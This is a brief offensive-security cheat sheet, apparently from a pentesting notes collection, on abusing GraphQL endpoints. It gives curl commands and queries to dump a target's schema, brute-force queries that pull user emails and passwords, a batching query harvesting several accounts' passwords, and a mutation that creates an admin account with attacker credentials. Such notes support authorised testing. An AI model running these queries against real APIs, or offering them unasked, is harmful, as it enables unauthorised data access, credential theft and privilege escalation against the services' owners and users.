# GraphQL Introspection

## Summary
Extract GraphQL schema and find vulnerabilities.

## Detection
```bash
# Try both GET and POST
curl -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

curl "https://target.com/graphql?query={__schema{types{name}}}"

# Common GraphQL endpoints
/graphql
/graph
/gql
/graphiql
/v1/graphql
/api/graphql
```

## Full Schema Dump

```graphql
query {
  __schema {
    types {
      name
      description
      fields {
        name
        description
        type {
          name
          kind
          ofType { name kind }
        }
      }
    }
  }
}
```

### Minimized (for URL query params)
```graphql
query={__schema{types{name,fields{name,type{name}}}}}
```

## When Introspection is Disabled

### Brute-force Field Names
```bash
# Common GraphQL mutations and queries
query={users{id,email,password}}
query={user(id:1){id,email,password}}
mutation{login(email:"admin",password:"test"){token}}
mutation{createUser(input:{email:"hacker@hack.com",password:"pwned",role:"admin"}){id,email,role}}
```

### Check for GraphQL Batching
```graphql
query {
  a: user(id: 1) { email password }
  b: user(id: 2) { email password }
  c: user(id: 3) { email password }
}
```

## Analysis
```bash
# Look for these in the schema:
- password, token, secret fields
- mutations without auth checks
- admin-only queries exposed
- deprecated fields (@deprecated)
```

## Techniques
- Disabled introspection? Try brute-forcing field names
- Look for deprecated fields, `__` prefixed fields
- Test mutations for mass assignment
- Try `__typename` on all endpoints
- Check for GraphQL playground/GraphiQL in browser
